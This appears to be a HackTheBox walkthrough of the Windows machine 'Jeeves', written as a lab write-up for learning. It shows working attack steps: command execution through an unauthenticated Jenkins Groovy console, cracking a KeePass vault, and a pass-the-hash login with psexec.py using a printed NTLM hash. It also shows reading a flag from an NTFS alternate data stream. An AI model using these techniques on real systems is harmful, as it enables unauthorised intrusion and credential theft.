# Jeevs — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Medium
**OS:** Windows

---

## TL;DR

Directory enumeration uncovers an exposed Jenkins server on port 50000 → Unauthenticated Jenkins Groovy script console allows execution of a reverse shell → Finding a Keepass database (`CEH.kdbx`) in the user's documents → Cracking the Keepass master password with Hashcat reveals a stored Pass-The-Hash NTLM credential → PTH as Administrator leads to the discovery of the root flag hidden inside an Alternate Data Stream (ADS).

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=1024 10.10.10.63
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Microsoft IIS httpd 10.0 |
| 135 | RPC | Microsoft Windows RPC |
| 445 | SMB | Microsoft Windows 7 - 10 microsoft-ds |
| 50000 | HTTP | Jetty 9.4.z-SNAPSHOT |

The server is running a standard IIS web page globally, but an interesting secondary HTTP service (Jetty) sits on port 50000. 

We scan port 50000 for hidden directories using Gobuster:

```bash
gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster quickly discovers the `/askjeeves` directory, which redirects to an open instance of a **Jenkins** automation server.

---

## Exploitation — Jenkins Script Console

Navigating to `http://10.10.10.63:50000/askjeeves`, we find that the Jenkins dashboard is accessible without any authentication. 

Jenkins has a built-in feature called the **Script Console**, which allows administrators to run arbitrary Groovy scripts on the server. Because we have unauthenticated access to the dashboard, we also have access to the Script Console (`/askjeeves/script`).

We can abuse this feature to execute system commands. A standard Groovy script to execute commands looks like this:

```groovy
def proc = "cmd.exe /c whoami".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

By replacing the command with a payload that downloads and executes a reverse shell (like a PowerShell one-liner or a base64 encoded Nishang script), we gain our initial foothold on the Windows machine.

We now have user access as `kohsuke`.

---

## Privilege Escalation — KeePass & Alternate Data Streams

While enumerating `kohsuke`’s home directory, we locate a KeePass password database file located at `C:\Users\kohsuke\Documents\CEH.kdbx`.

We transfer the `CEH.kdbx` file back to our attacking machine. To access the passwords inside, we must crack the master password. We use `keepass2john` to extract the hash into a crackable format:

```bash
keepass2john CEH.kdbx > keepass.hash
```

We then use John the Ripper (or Hashcat) with the RockYou wordlist to crack it:

```bash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The master password is successfully cracked: `moonshine1`.

Opening the database with `kpcli` or a KeePass GUI client, we find several entries. 

```text
kpcli:/CEH> show -f 0

Title: Backup stuff
Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Entry `0` ("Backup stuff") contains an NTLM hash rather than a plaintext password. This hash perfectly matches the format required for a Pass-The-Hash attack.

We use `crackmapexec` (or `netexec`) to verify the hash against the local SMB service:

```bash
crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
```

The result returns `Pwn3d!`, indicating the hash belongs to the local `Administrator`. 

We authenticate using `psexec.py` or Evil-WinRM:

```bash
psexec.py Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

We are `NT AUTHORITY\SYSTEM`. 

**The Root Flag:** 
Upon navigating to the Administrator's Desktop to read `root.txt`, we instead find a file named `hm.txt`. Reading it displays: *"Look deeper, the flag is elsewhere"*.

In Windows NTFS, files can have hidden metadata streams attached to them known as Alternate Data Streams (ADS). We can list all data streams for files in the directory using `dir /r`.

```cmd
dir /r
```

The output reveals a hidden stream attached to `hm.txt` named `hm.txt:root.txt:$DATA`. 

We extract the contents of the stream using `more`:

```cmd
more < hm.txt:root.txt
```

This reveals the real root flag. **Root.** 🎉

---

## Key Takeaways

- **Unauthenticated Administrative Interfaces:** Exposing powerful tools like Jenkins without authentication is a critical vulnerability. The Groovy Script Console is effectively a built-in RCE feature intended for administrators.
- **KeePass Security:** A password manager is only as secure as its master password. Weak master passwords ("moonshine1") negate the encryption of the entire vault.
- **Alternate Data Streams (ADS):** Attackers (and CTF creators) frequently abuse NTFS Alternate Data Streams to hide malicious payloads, backdoors, or sensitive data in plain sight. Always check for ADS during forensic analysis using `dir /r` or PowerShell's `Get-Item -Stream *`.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*